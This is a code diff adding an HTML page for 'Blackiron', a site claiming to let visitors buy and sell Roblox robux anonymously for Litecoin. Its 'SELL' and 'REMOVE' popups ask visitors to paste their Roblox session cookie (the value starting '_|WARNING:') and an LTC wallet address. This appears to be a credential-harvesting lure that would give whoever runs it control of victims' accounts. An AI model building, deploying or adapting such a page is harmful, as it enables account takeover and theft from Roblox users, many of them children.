@@ -1,0 +1,266 @@
+<html style="
+      text-align: center; 
+      color: rgb(255, 255, 255);
+      font-family:Verdana, Geneva, Tahoma, sans-serif";> 
+
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/x-icon" href="/icon.ico">
+  <script src="script.js"></script>
+
+  <div class="background-container">
+  <div class="stars"></div>
+  <div class="twinkling"></div>
+  <div class="clouds"></div>
+
+    
+  <head>
+      <title>Buy and sell robux safely.</title>
+  </head>
+
+
+  <body>
+    <header>
+      <b>
+        <i style="font-size: 400%; text-shadow: 1px 1px 4px rgb(0, 0, 0);">[Blackiron]</i>
+
+        <br>
+
+        <i style="text-shadow: 1px 1px 4px rgb(0, 0, 0);">NO SIGNUP | COMPLETELY ANONYMOUS | INSTANT PURCHASING</i>
+      </b>
+      
+
+      <br><br>
+
+
+      <p style="font-size: 150%;">
+        <ul style="display: flex; list-style: none; overflow-x: scroll; overflow-y: hidden; padding-left: 50px" id="live_feed">
+            
+        </ul>
+      </p>
+      
+
+      <br><br>
+
+
+      <p>
+        <b style="font-size: 250%; text-shadow: 1px 1px 4px rgb(0, 0, 0); color: rgb(219, 207, 101)" id="stock">346000</b>
+
+        <br>
+
+        <i><b style="font-size: 80%; text-shadow: 1px 1px 4px rgb(0, 0, 0)" id="accounts">[ACROSS 0 ACCOUNTS]</b></i>
+
+        <br>
+
+        <b style="font-size: 125%; text-shadow: 1px 1px 4px rgb(0, 0, 0); color: rgb(219, 207, 101)">Rate: $3.5 per 1000 B/T</b>
+
+        <br><br>
+
+        <button onclick="open_purchase1()" class="button-85">
+          PURCHASE
+        </button>
+
+        <br><br>
+
+        <button class="button-85" onclick="open_sell1()">
+          SELL
+        </button>
+
+        <br><br>
+        
+        <button class="button-85" onclick="open_remove1()">
+          REMOVE 
+        </button>
+      </p>
+
+
+      <div id="purchase1" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+            <p id="msg1">
+              Enter the amount of robux you would like to buy.
+            </p>
+
+            <br>
+
+            <input type="number" onchange="calc_cost()" id="purchase_amount" style="border: 0; width:200px; height: 50px; font-size: 40px; text-align: center; margin-top: -20">
+
+            <p id="cost">
+              Price: $0
+            </p>
+
+            <button class="button-85" onclick="open_purchase2()" style="font-size: 20;">
+              CONFIRM
+            </button>
+        </p>
+      </div>
+
+
+      <div id="purchase2" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+            <p id="msg2">
+              Make a gamepass and set its price to x. Afer that, enter its ID below.
+            </p>
+
+            <br>
+
+            <input type="number" id="gamepass" style="border: 0; width:200px; height: 50px; font-size: 40px; text-align: center; margin-top: -20">
+
+            <br><br>
+
+            <button class="button-85" onclick="open_purchase3()" style="font-size: 20;">
+                CONFIRM
+            </button>
+        </p>
+      </div>
+
+
+      <div id="purchase3" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+           <p id="msg4" style="color: rgb(0, 255, 0)">
+              UID: 5353 | GAMEPASS NAME: PLSDONATE
+           </p>
+
+
+            Do you understand that your robux will be pending for 7 days?
+
+            <br>
+
+            <button class="button-85" onclick="open_purchase4()" style="font-size: 20; margin-top:35px">
+                YES
+            </button>
+        </p>
+      </div>
+
+
+      <div id="purchase4" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+           <p id="msg5" style="color: rgb(255, 0, 0)">
+              [YOU WILL RECEIVE 134535 ROBUX AFTER TAX]
+           </p>
+
+
+            Do you understand that Roblox will tax you 30% on your gamepass sale?
+
+            <br>
+
+            <button class="button-85" onclick="open_purchase5()" style="font-size: 20; margin-top:35px">
+              YES
+            </button>
+        </p>
+      </div>
+
+
+      <div id="sell1" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+            <p id="msg6">
+              Enter the cookie to your account with robux below. It should start with '_|WARNING:'
+            </p>
+
+            <br><br>
+
+            <input type="string" id="cookie" style="border: 0; width:200px; height: 50px; font-size: 40px; text-align: center; margin-top: -20">
+
+            <br><br><br>
+
+            <button class="button-85" onclick="open_sell2()" style="font-size: 20;">
+              CONFIRM
+            </button>
+        </p>
+      </div>
+
+
+      <div id="sell2" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+            <p id="msg7" style="color: rgb(0, 255, 0)">
+              USERNAME: X | ROBUX: 0
+            </p>
+
+            <p id="msg8">
+              Enter your LTC wallet address below.
+            </p>
+
+            <br>
+
+            <input type="string" id="address" style="border: 0; width:200px; height: 50px; font-size: 40px; text-align: center; margin-top: -20">
+
+            <br><br><br>
+
+            <button class="button-85" onclick="open_sell3()" style="font-size: 20;">
+                CONFIRM
+            </button>
+        </p>
+      </div>
+
+
+      <div id="sell3" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+            <p style="color: rgb(0, 255, 0); font-size: 200%; padding-top: 40px;">
+              Your account has been listed successfully! 
+            </p>
+
+            <p style="font-size: 80%">
+              Click 'REMOVE' if you want to unlist the account.
+            </p>
+        </p>
+      </div>
+
+
+      <div id="remove1" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+            <p id="msg9">
+              Enter the cookie of the account you want to remove.
+            </p>
+
+            <br><br>
+
+            <input type="string" id="cookie2" style="border: 0; width:200px; height: 50px; font-size: 40px; text-align: center; margin-top: -20">
+
+            <br><br><br>
+
+            <button class="button-85" onclick="open_remove2()" style="font-size: 20;">
+                CONFIRM
+            </button>
+        </p>
+      </div>
+
+
+      <div id="remove2" class="popup" style="visibility: hidden">
+        <p style="font-size: 20px;">
+            <p style="color: rgb(0, 255, 0); font-size: 200%; padding-top: 40px;">
+              Your account has been delisted successfully! 
+            </p>
+        </p>
+      </div>
+
+
+      <br>
+
+
+      <p>
+        <b>
+            <i>- How does selling work?</i>
+
+            <p style="font-size: 80%; color: rgba(255, 255, 255, .5)">
+              Once you give us your cookie and LTC address, we list your account on the website. Every time someone buys your robux, we will send the buyer's money (minus fees) <span class="stroke" style="color: rgb(0, 255, 0)">STRAIGHT TO YOUR ADDRESS.</span>
+            </p>
+
+            <br><br>
+
+            <i>- How does buying work?</i>
+
+            <p style="font-size: 80%; color: rgba(255, 255, 255, .5)">
+              Once you input the amount you want along with the id of your gamepass, we wait for the transaction to have 3 confirmations. After it has 3 confirmations, an account will automatically purchase it. 
+            </p>
+
+            <br><br>
+
+            <i>- How much are the seller fees?</i>
+
+            <p style="font-size: 80%; color: rgba(255, 255, 255, .5)">
+              There is a <span class="stroke" style="color: rgb(0, 255, 0);">fee of 5%</span> per transaction. This means if someone buys $100 worth of robux, $95 will be sent to your LTC address immedietly.
+            </p>
+        </b>
+      </p>
+    </header>
+  </body>
+</html>
+
